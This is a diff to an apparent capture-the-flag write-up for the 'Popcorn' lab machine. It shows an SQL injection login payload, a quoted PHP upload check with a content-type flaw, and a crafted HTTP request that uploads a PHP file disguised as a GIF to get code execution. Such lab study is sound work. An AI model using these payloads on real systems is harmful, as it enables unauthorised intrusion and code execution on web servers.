@@ -71,3 +71,26 @@ $qid = db_query("
 ```
 username=admin'#--&password=romanrii
 ```
+
+## Upload Restrictions Bypass
+```php
+/* OSWE/HTB/Popcorn/Source/torrent/upload_file.php */
+if (($_FILES["file"]["type"] == "image/gif")
+  || ($_FILES["file"]["type"] == "image/jpeg")
+  || ($_FILES["file"]["type"] == "image/jpg")
+  || ($_FILES["file"]["type"] == "image/png")
+  && ($_FILES["file"]["size"] < 100000))
+```
+
+```
+POST /torrent/upload_file.php?mode=upload&id=723bc28f9b6f924cca68ccdff96b6190566ca6b4 HTTP/1.1
+Host: popcorn.htb
+
+------geckoformboundaryc03db213e2bddfefb219742aee8d9c95
+Content-Disposition: form-data; name="file"; filename="background.php"
+Content-Type: image/gif
+
+<?php phpinfo(); ?>
+```
+- PHP Info can now be seen via `/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php`
+
